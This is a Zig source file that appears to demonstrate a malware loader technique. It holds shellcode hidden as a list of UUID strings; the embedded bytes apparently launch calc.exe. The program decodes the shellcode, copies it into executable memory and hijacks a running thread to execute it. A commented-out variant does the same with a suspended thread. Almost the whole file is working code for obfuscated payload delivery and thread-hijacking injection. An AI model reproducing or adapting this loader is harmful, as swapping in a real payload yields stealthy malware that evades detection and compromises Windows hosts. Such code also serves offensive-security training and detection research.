const std = @import("std");
const sec = @import("zig-sec");

const win = std.os.windows;

const code_injection = sec.code_injection;
const payload_obfuscation = sec.payload_obfuscation;

const HANDLE = win.HANDLE;
const INFINITE = win.INFINITE;

const GetLastError = win.kernel32.GetLastError;
const CreateThread = win.kernel32.CreateThread;
const CloseHandle = win.CloseHandle;

const uuid_array = [_][:0]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E",
    "00657865-0000-0000-0000-000000000000",
};

// pub fn main() !void {
//     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
//     defer _ = gpa.deinit();
//     const allocator = gpa.allocator();

//     const shell_code = try payload_obfuscation.uuid.deobfuscate(allocator, &uuid_array);
//     defer allocator.free(shell_code);

//     const h_thread = CreateThread(
//         null,
//         0,
//         @ptrCast(&dummyFunction),
//         null,
//         // THREAD_SUSPENDED
//         4,
//         null,
//     ) orelse {
//         std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
//         return error.CreateThreadFailed;
//     };
//     defer CloseHandle(h_thread);

//     const shell_code_region = try code_injection.local.allocateExecutableMemory(shell_code);
//     try sec.thread.hijackThread(h_thread, shell_code_region, false);
// }

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shell_code = try payload_obfuscation.uuid.deobfuscate(allocator, &uuid_array);
    defer allocator.free(shell_code);

    const h_thread = CreateThread(
        null,
        0,
        @ptrCast(&dummyFunction),
        null,
        0,
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    defer CloseHandle(h_thread);

    std.time.sleep(std.time.ns_per_s * 10);

    const shell_code_region = try code_injection.local.allocateExecutableMemory(shell_code);
    try sec.thread.hijackThread(h_thread, shell_code_region, true);
}

fn dummyFunction() void {
    while (true) {
        std.debug.print("We are in the dummy function\n", .{});
        std.time.sleep(std.time.ns_per_s * 2);
    }
}
